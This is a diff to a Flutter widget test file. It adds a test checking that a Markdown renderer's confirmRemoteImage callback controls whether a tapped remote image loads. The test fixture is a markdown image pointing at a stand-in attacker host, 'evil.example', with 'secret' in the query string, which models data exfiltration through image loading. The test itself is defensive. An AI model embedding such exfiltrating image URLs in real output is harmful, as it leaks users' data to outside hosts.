@@ -178,6 +178,36 @@ void main() {
     expect(find.textContaining('Load from'), findsNothing);
   });
 
+  testWidgets('confirmRemoteImage decides whether a tapped image loads', (tester) async {
+    const md = '![Chart](https://evil.example/p?q=secret)';
+    final asked = <String>[];
+    Future<void> pumpWith(bool answer) => tester.pumpWidget(
+      host(
+        MarkdownView(
+          data: md,
+          style: style,
+          confirmRemoteImage: (src) async {
+            asked.add(src);
+            return answer;
+          },
+        ),
+      ),
+    );
+
+    await pumpWith(false);
+    await tester.tap(find.textContaining('Load from evil.example'));
+    await tester.pump();
+    expect(asked, ['https://evil.example/p?q=secret']);
+    expect(find.byType(Image), findsNothing);
+    expect(find.textContaining('Load from evil.example'), findsOneWidget);
+
+    await pumpWith(true);
+    await tester.tap(find.textContaining('Load from evil.example'));
+    await tester.pump();
+    expect(asked, hasLength(2));
+    expect(find.byType(Image), findsOneWidget);
+  });
+
   testWidgets('tapping a link reports its href', (tester) async {
     final taps = <String>[];
     await pumpMarkdown(tester, '[Open docs](https://docs.dev)', onTapLink: taps.add);
